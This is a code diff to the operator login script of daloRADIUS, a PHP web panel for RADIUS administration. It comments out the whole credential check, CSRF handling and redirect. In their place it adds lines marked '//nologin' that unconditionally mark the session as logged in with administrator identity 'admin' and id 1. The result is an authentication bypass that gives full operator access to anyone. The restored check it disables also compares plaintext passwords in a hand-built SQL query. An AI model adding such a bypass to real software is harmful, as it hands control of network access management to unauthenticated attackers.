@@ -29,6 +29,8 @@ include_once('../common/includes/config_read.php');
 
 dalo_session_start();
 
+/*
+
 $errorMessage = '';
 
 // we need to set location name session variable before opening the database
@@ -61,21 +63,19 @@ if (array_key_exists('csrf_token', $_POST) && isset($_POST['csrf_token']) &&
     $operator_user = $dbSocket->escapeSimple($_POST['operator_user']);
     $operator_pass = $dbSocket->escapeSimple($_POST['operator_pass']);
     
-   // $sqlFormat = "select * from %s where username='%s' and password='%s'";
-   // $sql = sprintf($sqlFormat, $configValues['CONFIG_DB_TBL_DALOOPERATORS'], $operator_user, $operator_pass);
-    //$res = $dbSocket->query($sql);
-    //$numRows = $res->numRows();
+    $sqlFormat = "select * from %s where username='%s' and password='%s'";
+    $sql = sprintf($sqlFormat, $configValues['CONFIG_DB_TBL_DALOOPERATORS'], $operator_user, $operator_pass);
+    $res = $dbSocket->query($sql);
+    $numRows = $res->numRows();
     
     // we only accept ONE AND ONLY ONE RECORD as result
-    //if ($numRows === 1) {
-        //$row = $res->fetchRow(DB_FETCHMODE_ASSOC);
-        //$operator_id = $row['id'];
+    if ($numRows === 1) {
+        $row = $res->fetchRow(DB_FETCHMODE_ASSOC);
+        $operator_id = $row['id'];
         
         $_SESSION['daloradius_logged_in'] = true;
-       // $_SESSION['operator_user'] = $operator_user;
-        $_SESSION['operator_user'] = admin;
-        //$_SESSION['operator_id'] = $operator_id;
-        $_SESSION['operator_id'] = 1;
+        $_SESSION['operator_user'] = $operator_user;
+        $_SESSION['operator_id'] = $operator_id;
         
         // lets update the lastlogin time for this operator
         $now = date("Y-m-d H:i:s");
@@ -83,7 +83,7 @@ if (array_key_exists('csrf_token', $_POST) && isset($_POST['csrf_token']) &&
         $sql = sprintf($sqlFormat, $configValues['CONFIG_DB_TBL_DALOOPERATORS'], $now, $operator_user);
         $res = $dbSocket->query($sql);
 
-   // }
+    }
     
     // close connection to db before redirecting
     include('../common/includes/db_close.php');
@@ -100,5 +100,11 @@ if ($_SESSION['daloradius_logged_in'] !== true) {
 }
 
 header("Location: $header_location");
+
+*/
+//nologin
+$_SESSION['daloradius_logged_in'] = true;
+$_SESSION['operator_user'] = 'admin';
+$_SESSION['operator_id'] = '1';
 
 ?>
